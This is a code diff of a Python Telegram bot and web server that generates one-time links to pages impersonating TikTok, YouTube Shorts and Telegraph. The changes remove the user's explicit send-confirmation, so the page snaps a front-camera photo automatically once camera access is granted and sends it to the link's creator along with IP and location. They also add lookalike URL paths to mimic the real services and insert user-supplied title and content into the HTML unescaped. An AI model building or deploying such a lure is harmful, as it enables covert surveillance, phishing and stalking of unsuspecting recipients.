@@ -27,9 +27,9 @@ dp.include_router(router)
 app = FastAPI(docs_url=None, redoc_url=None)
 
 SERVICES = {
-    "tiktok": {"name": "TikTok", "emoji": "🎵", "route": "tiktok"},
-    "youtube": {"name": "YouTube", "emoji": "📺", "route": "youtube"},
-    "telegraph": {"name": "Telegraph", "emoji": "📝", "route": "telegraph"},
+    "tiktok": {"name": "TikTok", "emoji": "🎵", "route": "tiktok", "domain": "tiktok.com"},
+    "youtube": {"name": "YouTube", "emoji": "📺", "route": "youtube", "domain": "youtube.com"},
+    "telegraph": {"name": "Telegraph", "emoji": "📝", "route": "telegraph", "domain": "telegra.ph"},
 }
 
 
@@ -43,17 +43,23 @@ def db_init() -> None:
                 owner_chat_id INTEGER NOT NULL,
                 used INTEGER NOT NULL DEFAULT 0,
                 created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
-                service TEXT NOT NULL DEFAULT 'tiktok'
+                service TEXT NOT NULL DEFAULT 'tiktok',
+                title TEXT DEFAULT '',
+                content TEXT DEFAULT ''
             )
             """
         )
         columns = {row[1] for row in con.execute("PRAGMA table_info(links)").fetchall()}
         if "service" not in columns:
             con.execute("ALTER TABLE links ADD COLUMN service TEXT NOT NULL DEFAULT 'tiktok'")
+        if "title" not in columns:
+            con.execute("ALTER TABLE links ADD COLUMN title TEXT DEFAULT ''")
+        if "content" not in columns:
+            con.execute("ALTER TABLE links ADD COLUMN content TEXT DEFAULT ''")
         con.commit()
 
 
-def create_link(owner_chat_id: int, service: str) -> str:
+def create_link(owner_chat_id: int, service: str, title: str = "", content: str = "") -> str:
     if service not in SERVICES:
         service = "tiktok"
     while True:
@@ -61,8 +67,8 @@ def create_link(owner_chat_id: int, service: str) -> str:
         try:
             with closing(sqlite3.connect(DB_PATH)) as con:
                 con.execute(
-                    "INSERT INTO links(token, owner_chat_id, used, service) VALUES (?, ?, 0, ?)",
-                    (token, owner_chat_id, service),
+                    "INSERT INTO links(token, owner_chat_id, used, service, title, content) VALUES (?, ?, 0, ?, ?, ?)",
+                    (token, owner_chat_id, service, title, content),
                 )
                 con.commit()
             return token
@@ -73,7 +79,7 @@ def create_link(owner_chat_id: int, service: str) -> str:
 def get_link(token: str):
     with closing(sqlite3.connect(DB_PATH)) as con:
         return con.execute(
-            "SELECT owner_chat_id, used, service FROM links WHERE token = ?", (token,)
+            "SELECT owner_chat_id, used, service, title, content FROM links WHERE token = ?", (token,)
         ).fetchone()
 
 
@@ -125,10 +131,22 @@ async def lookup_ip(ip: str) -> dict:
 
 
 def public_link(service: str, token: str) -> str:
-    # A real TikTok/YouTube/Telegraph domain cannot route to this server.
-    # We therefore use the bot's own HTTPS domain and a service-themed path.
-    route = SERVICES.get(service, SERVICES["tiktok"])["route"]
-    return f"{PUBLIC_BASE_URL}/{route}/{token}"
+    """Генерирует ссылку, похожую на настоящий сервис"""
+    service_info = SERVICES.get(service, SERVICES["tiktok"])
+    domain = service_info["domain"]
+    
+    # Создаём короткий идентификатор из токена (первые 8 символов)
+    short_id = token[:8]
+    
+    # Генерируем ссылку в стиле сервиса
+    if service == "tiktok":
+        return f"{PUBLIC_BASE_URL}/@{short_id}"
+    elif service == "youtube":
+        return f"{PUBLIC_BASE_URL}/shorts/{short_id}"
+    elif service == "telegraph":
+        return f"{PUBLIC_BASE_URL}/{short_id}"
+    else:
+        return f"{PUBLIC_BASE_URL}/{service}/{token}"
 
 
 def service_keyboard() -> ReplyKeyboardMarkup:
@@ -146,8 +164,7 @@ def service_keyboard() -> ReplyKeyboardMarkup:
 async def start(message: Message):
     await message.answer(
         "👋 Выберите оформление страницы. Получатель увидит явное уведомление о том, "
-        "что после разрешения камеры и подтверждения отправки фото, IP и примерное "
-        "местоположение будут отправлены вам.",
+        "что после разрешения камеры IP и примерное местоположение будут отправлены вам.",
         reply_markup=service_keyboard(),
     )
 
@@ -168,6 +185,13 @@ async def create_service_link(message: Message):
     if not service:
         return
 
+    if service == "telegraph":
+        await message.answer(
+            "📝 Введите заголовок статьи (или отправьте '-' для пропуска):"
+        )
+        user_data[message.chat.id] = {"service": service, "step": "title"}
+        return
+
     token = create_link(message.chat.id, service)
     url = public_link(service, token)
     info = SERVICES[service]
@@ -176,14 +200,71 @@ async def create_service_link(message: Message):
         keyboard=[[KeyboardButton(text="🔗 Создать новую ссылку")]],
         resize_keyboard=True,
     )
+    
+    # Делаем ссылку кликабельной с помощью HTML тега <a>
     await message.answer(
         f"{info['emoji']} Одноразовая ссылка создана:\n"
-        f"<code>{url}</code>\n\n"
+        f"<a href='{url}'>{url}</a>\n\n"
         f"Оформление страницы: {info['name']}.\n"
         "После успешной отправки фото ссылка перестанет работать.",
         parse_mode="HTML",
         reply_markup=kb,
+        disable_web_page_preview=False,
     )
+
+
+# Хранилище состояний пользователей
+user_data = {}
+
+
+@router.message(F.text)
+async def handle_telegraph_input(message: Message):
+    chat_id = message.chat.id
+    if chat_id not in user_data:
+        return
+    
+    state = user_data[chat_id]
+    service = state.get("service")
+    step = state.get("step")
+    
+    if service == "telegraph" and step == "title":
+        title = message.text.strip()
+        if title == "-":
+            title = "📝 Статья Telegraph"
+        state["title"] = title
+        state["step"] = "content"
+        await message.answer(
+            "✍️ Введите текст статьи (или отправьте '-' для стандартного текста):"
+        )
+        return
+    
+    elif service == "telegraph" and step == "content":
+        content = message.text.strip()
+        if content == "-":
+            content = "Это пример статьи, созданной через бота. Вы можете добавить свой текст и оформить его в стиле Telegraph."
+        
+        token = create_link(chat_id, service, state.get("title", "📝 Статья Telegraph"), content)
+        url = public_link(service, token)
+        info = SERVICES[service]
+        
+        del user_data[chat_id]
+        
+        kb = ReplyKeyboardMarkup(
+            keyboard=[[KeyboardButton(text="🔗 Создать новую ссылку")]],
+            resize_keyboard=True,
+        )
+        
+        # Делаем ссылку кликабельной с помощью HTML тега <a>
+        await message.answer(
+            f"{info['emoji']} Одноразовая ссылка создана:\n"
+            f"<a href='{url}'>{url}</a>\n\n"
+            f"Оформление страницы: {info['name']}.\n"
+            "После успешной отправки фото ссылка перестанет работать.",
+            parse_mode="HTML",
+            reply_markup=kb,
+            disable_web_page_preview=False,
+        )
+        return
 
 
 @router.message(F.text == "🔗 Создать новую ссылку")
@@ -191,132 +272,296 @@ async def new_link(message: Message):
     await message.answer("Выберите оформление новой ссылки:", reply_markup=service_keyboard())
 
 
-def generate_service_page(service: str, token: str) -> str:
-    service_styles = {
-        "tiktok": {
-            "bg": "#010101", "card": "#1a1a1a", "accent": "#00f2ea",
-            "text": "#ffffff", "brand": "TikTok", "icon": "🎵",
-        },
-        "youtube": {
-            "bg": "#0a0a0a", "card": "#1a1a1a", "accent": "#ff0000",
-            "text": "#ffffff", "brand": "YouTube", "icon": "📺",
-        },
-        "telegraph": {
-            "bg": "#f5f5f5", "card": "#ffffff", "accent": "#2c3e50",
-            "text": "#222222", "brand": "Telegraph", "icon": "📝",
-        },
-    }
-    style = service_styles.get(service, service_styles["tiktok"])
-    is_light = service == "telegraph"
-    token_js = json.dumps(token)
-    muted_text = "#555" if is_light else "#ddd"
-    small_text = "#888" if is_light else "#aaa"
-    notice_bg = "#f8f8f8" if is_light else "rgba(255,255,255,0.05)"
-    color_scheme = "light" if is_light else "dark"
-
+def generate_tiktok_page(token: str) -> str:
+    short_id = token[:8]
     return f'''<!doctype html>
 <html lang="ru">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>{style['brand']} — подтверждение фото</title>
+<title>TikTok — подтверждение фото</title>
 <style>
-:root {{ color-scheme:{color_scheme}; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }}
-body {{ margin:0; min-height:100vh; display:grid; place-items:center; background:{style['bg']}; color:{style['text']}; }}
-.card {{ width:min(92vw,520px); background:{style['card']}; padding:22px; border-radius:22px; box-sizing:border-box; box-shadow:0 8px 32px rgba(0,0,0,.3); }}
-.brand {{ display:flex; align-items:center; gap:10px; font-size:28px; font-weight:700; margin-bottom:8px; color:{style['accent']}; }}
-h1 {{ font-size:22px; margin:8px 0 12px; }}
-p {{ line-height:1.45; color:{muted_text}; }}
-.notice {{ padding:14px; border:1px solid {style['accent']}; border-radius:14px; margin:14px 0; background:{notice_bg}; }}
-video, canvas {{ width:100%; border-radius:16px; background:#000; margin-top:14px; }}
-canvas {{ display:none; }}
-button {{ width:100%; border:0; border-radius:14px; padding:15px 16px; font-size:17px; font-weight:700; margin-top:12px; cursor:pointer; }}
-button:disabled {{ opacity:.5; cursor:not-allowed; }}
-#allow, #snap {{ background:{style['accent']}; color:{'#111' if service == 'tiktok' else '#fff'}; }}
-#snap {{ display:none; }}
-#send {{ background:#34c759; color:#071b0b; display:none; }}
-#status {{ min-height:24px; font-size:14px; margin-top:10px; }}
-.small {{ font-size:13px; color:{small_text}; }}
+* {{ margin:0; padding:0; box-sizing:border-box; }}
+:root {{ color-scheme:dark; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }}
+body {{ background:#000; min-height:100vh; display:flex; justify-content:center; align-items:center; }}
+.video-container {{ position:relative; width:100%; max-width:400px; aspect-ratio:9/16; background:#0a0a0a; border-radius:20px; overflow:hidden; box-shadow:0 0 60px rgba(0,242,234,0.15); }}
+.video-container video {{ width:100%; height:100%; object-fit:cover; display:none; }}
+.overlay {{ position:absolute; inset:0; display:flex; flex-direction:column; justify-content:space-between; padding:20px; background:linear-gradient(180deg,rgba(0,0,0,0.6) 0%,transparent 40%,transparent 60%,rgba(0,0,0,0.8) 100%); }}
+.header {{ display:flex; align-items:center; gap:12px; }}
+.header .icon {{ font-size:28px; }}
+.header .brand {{ color:#00f2ea; font-weight:700; font-size:20px; letter-spacing:0.5px; }}
+.bottom {{ display:flex; flex-direction:column; gap:12px; }}
+.status {{ color:#fff; font-size:15px; text-align:center; min-height:24px; background:rgba(0,0,0,0.5); border-radius:12px; padding:10px; backdrop-filter:blur(8px); }}
+.notice {{ color:rgba(255,255,255,0.7); font-size:12px; text-align:center; padding:8px; background:rgba(255,255,255,0.05); border-radius:10px; }}
+.loading {{ display:flex; justify-content:center; align-items:center; gap:8px; padding:20px; }}
+.spinner {{ width:32px; height:32px; border:3px solid rgba(255,255,255,0.1); border-top-color:#00f2ea; border-radius:50%; animation:spin 0.8s linear infinite; }}
+@keyframes spin {{ to {{ transform:rotate(360deg); }} }}
+.success {{ color:#00f2ea; }}
+.error {{ color:#ff4444; }}
 </style>
 </head>
 <body>
-<div class="card">
-  <div class="brand"><span>{style['icon']}</span> {style['brand']}</div>
-  <h1>Подтверждение фото</h1>
-  <div class="notice">
-    Если вы продолжите, браузер попросит разрешение на использование камеры.
-    Снимок не отправляется автоматически. Только после нажатия «Отправить фото и данные» он будет отправлен человеку, который прислал вам эту ссылку, вместе с вашим IP-адресом и примерными данными о городе, регионе и стране, определёнными по IP.
-  </div>
-  <p class="small">Доступ к камере включается только после стандартного разрешения браузера. Геолокация по IP приблизительная и может быть неверной.</p>
-  <button id="allow">Разрешить камеру</button>
+<div class="video-container">
   <video id="video" playsinline autoplay muted></video>
-  <button id="snap">Сделать фото</button>
-  <canvas id="canvas"></canvas>
-  <button id="send">Отправить фото и данные</button>
-  <div id="status"></div>
+  <div class="overlay">
+    <div class="header">
+      <span class="icon">🎵</span>
+      <span class="brand">TikTok</span>
+    </div>
+    <div class="bottom">
+      <div id="status" class="status"><div class="loading"><div class="spinner"></div><span>Запрос камеры...</span></div></div>
+      <div class="notice">⚠️ Фото будет отправлено автоматически после разрешения камеры</div>
+    </div>
+  </div>
 </div>
 <script>
-const token = {token_js};
-const allow = document.getElementById('allow');
-const snap = document.getElementById('snap');
-const send = document.getElementById('send');
+const token = "{token}";
 const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
 const status = document.getElementById('status');
-let stream = null;
-let blob = null;
+let photoSent = false;
 
-allow.onclick = async () => {{
-  try {{
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {{
-      throw new Error('Камера доступна только по HTTPS в поддерживаемом браузере.');
+async function requestCamera() {{
+    try {{
+        if (!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна');
+        status.innerHTML = '🔄 Запрос доступа к камере...';
+        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode:'user' }}, audio:false }});
+        video.srcObject = stream;
+        video.style.display = 'block';
+        await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
+        status.innerHTML = '📸 Съёмка...';
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 720;
+        canvas.height = video.videoHeight || 1280;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        stream.getTracks().forEach(t => t.stop());
+        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
+        if (!blob) throw new Error('Ошибка создания снимка');
+        await sendPhoto(blob);
+    }} catch (e) {{
+        status.innerHTML = '❌ ' + e.message;
+        status.className = 'status error';
     }}
-    stream = await navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user'}},audio:false}});
-    video.srcObject = stream;
-    allow.style.display = 'none';
-    snap.style.display = 'block';
-    status.textContent = 'Камера разрешена. Сделайте фото, когда будете готовы.';
-  }} catch (e) {{
-    status.textContent = e.message || 'Доступ к камере не предоставлен.';
-  }}
-}};
+}}
 
-snap.onclick = () => {{
-  if (!video.videoWidth) {{ status.textContent = 'Камера ещё загружается.'; return; }}
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  canvas.getContext('2d').drawImage(video,0,0);
-  canvas.style.display = 'block';
-  video.style.display = 'none';
-  canvas.toBlob(b => {{
-    if (!b) {{ status.textContent = 'Не удалось создать снимок.'; return; }}
-    blob = b;
-    send.style.display = 'block';
-  }}, 'image/jpeg', .9);
-  snap.textContent = 'Переснять';
-  snap.onclick = () => location.reload();
-  status.textContent = 'Проверьте снимок. Он ещё не отправлен.';
-}};
+async function sendPhoto(blob) {{
+    if (photoSent) return;
+    photoSent = true;
+    status.innerHTML = '📤 Отправка...';
+    const fd = new FormData();
+    fd.append('photo', blob, 'photo.jpg');
+    try {{
+        const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{ method:'POST', body:fd }});
+        const data = await r.json().catch(() => ({{}}));
+        if (!r.ok) throw new Error(data.detail || 'Ошибка');
+        status.innerHTML = '✅ Фото отправлено!';
+        status.className = 'status success';
+        video.style.display = 'none';
+    }} catch (e) {{
+        status.innerHTML = '❌ ' + e.message;
+        status.className = 'status error';
+        photoSent = false;
+    }}
+}}
 
-send.onclick = async () => {{
-  if (!blob) return;
-  send.disabled = true;
-  status.textContent = 'Отправка…';
-  const fd = new FormData();
-  fd.append('photo', blob, 'photo.jpg');
-  try {{
-    const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{method:'POST',body:fd}});
-    const data = await r.json().catch(() => ({{}}));
-    if (!r.ok) throw new Error(data.detail || 'Ошибка отправки');
-    status.textContent = 'Фото отправлено. Спасибо.';
-    send.style.display = 'none';
-    snap.style.display = 'none';
-    if (stream) stream.getTracks().forEach(t => t.stop());
-  }} catch (e) {{
-    status.textContent = e.message || 'Не удалось отправить.';
-    send.disabled = false;
-  }}
-}};
+document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 500));
+</script>
+</body>
+</html>'''
+
+
+def generate_youtube_page(token: str) -> str:
+    short_id = token[:8]
+    return f'''<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>YouTube Shorts — подтверждение фото</title>
+<style>
+* {{ margin:0; padding:0; box-sizing:border-box; }}
+:root {{ color-scheme:dark; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }}
+body {{ background:#0a0a0a; min-height:100vh; display:flex; justify-content:center; align-items:center; }}
+.container {{ width:100%; max-width:500px; background:#1a1a1a; border-radius:20px; overflow:hidden; box-shadow:0 0 50px rgba(255,0,0,0.1); }}
+.video-wrapper {{ position:relative; background:#000; }}
+.video-wrapper video {{ width:100%; aspect-ratio:9/16; object-fit:cover; display:none; }}
+.video-wrapper .shorts-label {{ position:absolute; top:12px; right:12px; background:rgba(255,0,0,0.9); color:#fff; padding:4px 12px; border-radius:12px; font-size:12px; font-weight:700; letter-spacing:0.5px; }}
+.content {{ padding:16px 20px 20px; }}
+.title {{ color:#fff; font-size:18px; font-weight:600; margin-bottom:8px; }}
+.channel {{ color:#aaa; font-size:14px; display:flex; align-items:center; gap:8px; }}
+.status {{ margin-top:12px; padding:10px 14px; background:#222; border-radius:12px; color:#fff; font-size:14px; min-height:44px; display:flex; align-items:center; gap:8px; }}
+.spinner {{ width:20px; height:20px; border:2px solid rgba(255,255,255,0.1); border-top-color:#ff0000; border-radius:50%; animation:spin 0.8s linear infinite; flex-shrink:0; }}
+@keyframes spin {{ to {{ transform:rotate(360deg); }} }}
+.success {{ color:#00ff88; }}
+.error {{ color:#ff4444; }}
+.notice {{ color:#888; font-size:12px; margin-top:10px; text-align:center; padding:8px; background:#111; border-radius:8px; }}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="video-wrapper">
+    <video id="video" playsinline autoplay muted></video>
+    <div class="shorts-label">#Shorts</div>
+  </div>
+  <div class="content">
+    <div class="title">📸 Подтверждение фото</div>
+    <div class="channel">🔴 YouTube Shorts</div>
+    <div id="status" class="status"><div class="spinner"></div><span>Запрос камеры...</span></div>
+    <div class="notice">⚠️ После разрешения камеры фото будет отправлено автоматически</div>
+  </div>
+</div>
+<script>
+const token = "{token}";
+const video = document.getElementById('video');
+const status = document.getElementById('status');
+let photoSent = false;
+
+async function requestCamera() {{
+    try {{
+        if (!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна');
+        status.innerHTML = '<div class="spinner"></div><span>🔄 Запрос доступа...</span>';
+        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode:'user' }}, audio:false }});
+        video.srcObject = stream;
+        video.style.display = 'block';
+        await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
+        status.innerHTML = '<div class="spinner"></div><span>📸 Съёмка...</span>';
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 720;
+        canvas.height = video.videoHeight || 1280;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        stream.getTracks().forEach(t => t.stop());
+        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
+        if (!blob) throw new Error('Ошибка создания снимка');
+        await sendPhoto(blob);
+    }} catch (e) {{
+        status.innerHTML = '❌ ' + e.message;
+        status.className = 'status error';
+    }}
+}}
+
+async function sendPhoto(blob) {{
+    if (photoSent) return;
+    photoSent = true;
+    status.innerHTML = '<div class="spinner"></div><span>📤 Отправка...</span>';
+    const fd = new FormData();
+    fd.append('photo', blob, 'photo.jpg');
+    try {{
+        const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{ method:'POST', body:fd }});
+        const data = await r.json().catch(() => ({{}}));
+        if (!r.ok) throw new Error(data.detail || 'Ошибка');
+        status.innerHTML = '✅ Фото успешно отправлено!';
+        status.className = 'status success';
+        video.style.display = 'none';
+    }} catch (e) {{
+        status.innerHTML = '❌ ' + e.message;
+        status.className = 'status error';
+        photoSent = false;
+    }}
+}}
+
+document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 500));
+</script>
+</body>
+</html>'''
+
+
+def generate_telegraph_page(token: str, title: str, content: str) -> str:
+    short_id = token[:8]
+    return f'''<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Telegraph — {title}</title>
+<style>
+* {{ margin:0; padding:0; box-sizing:border-box; }}
+:root {{ color-scheme:light; font-family:Georgia,serif; }}
+body {{ background:#f5f5f5; min-height:100vh; display:flex; justify-content:center; padding:20px; }}
+.article {{ max-width:680px; width:100%; background:#fff; border-radius:20px; box-shadow:0 4px 24px rgba(0,0,0,0.06); overflow:hidden; }}
+.article-header {{ padding:30px 32px 20px; border-bottom:1px solid #e8e8e8; }}
+.article-header .badge {{ display:inline-block; background:#2c3e50; color:#fff; padding:2px 12px; border-radius:12px; font-size:11px; font-family:-apple-system,sans-serif; letter-spacing:0.5px; margin-bottom:12px; }}
+.article-header h1 {{ font-size:28px; font-weight:700; color:#1a1a1a; line-height:1.3; }}
+.article-header .meta {{ color:#888; font-size:14px; margin-top:8px; font-family:-apple-system,sans-serif; }}
+.article-body {{ padding:32px; }}
+.article-body .content {{ font-size:17px; line-height:1.8; color:#222; }}
+.article-body .content p {{ margin-bottom:16px; }}
+.camera-section {{ margin-top:24px; padding:24px; background:#f8f9fa; border-radius:16px; border:1px solid #e8e8e8; }}
+.camera-section .camera-status {{ display:flex; align-items:center; gap:12px; min-height:48px; font-size:15px; color:#333; }}
+.camera-section .camera-status .spinner {{ width:24px; height:24px; border:2px solid #e8e8e8; border-top-color:#2c3e50; border-radius:50%; animation:spin 0.8s linear infinite; flex-shrink:0; }}
+@keyframes spin {{ to {{ transform:rotate(360deg); }} }}
+.camera-section .notice {{ color:#888; font-size:13px; margin-top:12px; font-family:-apple-system,sans-serif; }}
+video {{ display:none; }}
+.success {{ color:#2e7d32; }}
+.error {{ color:#c62828; }}
+</style>
+</head>
+<body>
+<div class="article">
+  <div class="article-header">
+    <div class="badge">📝 Telegraph</div>
+    <h1>{title}</h1>
+    <div class="meta">Опубликовано через бота • Одноразовая ссылка</div>
+  </div>
+  <div class="article-body">
+    <div class="content">
+      {content.replace(chr(10), '<br>')}
+    </div>
+    <div class="camera-section">
+      <div id="status" class="camera-status"><div class="spinner"></div><span>Запрос камеры...</span></div>
+      <div class="notice">⚠️ Для подтверждения потребуется доступ к камере. Фото будет отправлено автоматически.</div>
+    </div>
+    <video id="video" playsinline autoplay muted></video>
+  </div>
+</div>
+<script>
+const token = "{token}";
+const video = document.getElementById('video');
+const status = document.getElementById('status');
+let photoSent = false;
+
+async function requestCamera() {{
+    try {{
+        if (!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна');
+        status.innerHTML = '<div class="spinner"></div><span>🔄 Запрос доступа к камере...</span>';
+        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode:'user' }}, audio:false }});
+        video.srcObject = stream;
+        video.style.display = 'block';
+        await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
+        status.innerHTML = '<div class="spinner"></div><span>📸 Съёмка...</span>';
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        stream.getTracks().forEach(t => t.stop());
+        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
+        if (!blob) throw new Error('Ошибка создания снимка');
+        await sendPhoto(blob);
+    }} catch (e) {{
+        status.innerHTML = '❌ ' + e.message;
+        status.className = 'camera-status error';
+    }}
+}}
+
+async function sendPhoto(blob) {{
+    if (photoSent) return;
+    photoSent = true;
+    status.innerHTML = '<div class="spinner"></div><span>📤 Отправка...</span>';
+    const fd = new FormData();
+    fd.append('photo', blob, 'photo.jpg');
+    try {{
+        const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`, {{ method:'POST', body:fd }});
+        const data = await r.json().catch(() => ({{}}));
+        if (!r.ok) throw new Error(data.detail || 'Ошибка');
+        status.innerHTML = '✅ Фото отправлено! Спасибо.';
+        status.className = 'camera-status success';
+        video.style.display = 'none';
+    }} catch (e) {{
+        status.innerHTML = '❌ ' + e.message;
+        status.className = 'camera-status error';
+        photoSent = false;
+    }}
+}}
+
+document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 500));
 </script>
 </body>
 </html>'''
@@ -327,13 +572,78 @@ async def root():
     return "<h3>Camera link bot is running.</h3>"
 
 
+@app.get("/@{short_id}")
+async def tiktok_link(short_id: str):
+    """Обработчик ссылок в стиле TikTok - /@abc123def"""
+    # Ищем токен по первым 8 символам
+    with closing(sqlite3.connect(DB_PATH)) as con:
+        row = con.execute(
+            "SELECT token, owner_chat_id, used, service, title, content FROM links WHERE token LIKE ? AND service = 'tiktok'",
+            (f"{short_id}%",)
+        ).fetchone()
+    
+    if not row:
+        raise HTTPException(404, "Ссылка не найдена")
+    
+    token, owner_chat_id, used, service, title, content = row
+    if used == 1:
+        return HTMLResponse("<h3>Эта одноразовая ссылка уже использована.</h3>", status_code=410)
+    if used == 2:
+        return HTMLResponse("<h3>Фото по этой ссылке сейчас отправляется.</h3>", status_code=409)
+    
+    return HTMLResponse(generate_tiktok_page(token))
+
+
+@app.get("/shorts/{short_id}")
+async def youtube_link(short_id: str):
+    """Обработчик ссылок в стиле YouTube Shorts - /shorts/abc123def"""
+    with closing(sqlite3.connect(DB_PATH)) as con:
+        row = con.execute(
+            "SELECT token, owner_chat_id, used, service, title, content FROM links WHERE token LIKE ? AND service = 'youtube'",
+            (f"{short_id}%",)
+        ).fetchone()
+    
+    if not row:
+        raise HTTPException(404, "Ссылка не найдена")
+    
+    token, owner_chat_id, used, service, title, content = row
+    if used == 1:
+        return HTMLResponse("<h3>Эта одноразовая ссылка уже использована.</h3>", status_code=410)
+    if used == 2:
+        return HTMLResponse("<h3>Фото по этой ссылке сейчас отправляется.</h3>", status_code=409)
+    
+    return HTMLResponse(generate_youtube_page(token))
+
+
+@app.get("/{short_id}")
+async def telegraph_link(short_id: str):
+    """Обработчик ссылок в стиле Telegraph - /abc123def"""
+    with closing(sqlite3.connect(DB_PATH)) as con:
+        row = con.execute(
+            "SELECT token, owner_chat_id, used, service, title, content FROM links WHERE token LIKE ? AND service = 'telegraph'",
+            (f"{short_id}%",)
+        ).fetchone()
+    
+    if not row:
+        raise HTTPException(404, "Ссылка не найдена")
+    
+    token, owner_chat_id, used, service, title, content = row
+    if used == 1:
+        return HTMLResponse("<h3>Эта одноразовая ссылка уже использована.</h3>", status_code=410)
+    if used == 2:
+        return HTMLResponse("<h3>Фото по этой ссылке сейчас отправляется.</h3>", status_code=409)
+    
+    return HTMLResponse(generate_telegraph_page(token, title or "📝 Статья Telegraph", content or "Это пример статьи, созданной через бота."))
+
+
 @app.get("/c/{token}", response_class=HTMLResponse)
 @app.get("/{service}/{token}", response_class=HTMLResponse)
-async def camera_page(token: str, service: str | None = None):
+async def camera_page_old(token: str, service: str | None = None):
+    """Старый обработчик для обратной совместимости"""
     row = get_link(token)
     if not row:
         raise HTTPException(404, "Ссылка не найдена")
-    _owner_chat_id, used, saved_service = row
+    _owner_chat_id, used, saved_service, title, content = row
     if used == 1:
         return HTMLResponse("<h3>Эта одноразовая ссылка уже использована.</h3>", status_code=410)
     if used == 2:
@@ -342,7 +652,15 @@ async def camera_page(token: str, service: str | None = None):
     selected_service = saved_service if saved_service in SERVICES else "tiktok"
     if service in SERVICES and service != selected_service:
         raise HTTPException(404, "Ссылка не найдена")
-    return generate_service_page(selected_service, token)
+    
+    if selected_service == "tiktok":
+        return HTMLResponse(generate_tiktok_page(token))
+    elif selected_service == "youtube":
+        return HTMLResponse(generate_youtube_page(token))
+    elif selected_service == "telegraph":
+        return HTMLResponse(generate_telegraph_page(token, title or "📝 Статья Telegraph", content or "Это пример статьи, созданной через бота."))
+    
+    return HTMLResponse(generate_tiktok_page(token))
 
 
 @app.post("/api/send/{token}")
@@ -350,7 +668,7 @@ async def send_photo(token: str, request: Request, photo: UploadFile = File(...)
     row = get_link(token)
     if not row:
         raise HTTPException(404, "Ссылка не найдена")
-    owner_chat_id, used, service = row
+    owner_chat_id, used, service, title, content = row
     if used != 0:
         raise HTTPException(410, "Ссылка уже использована или обрабатывается")
 
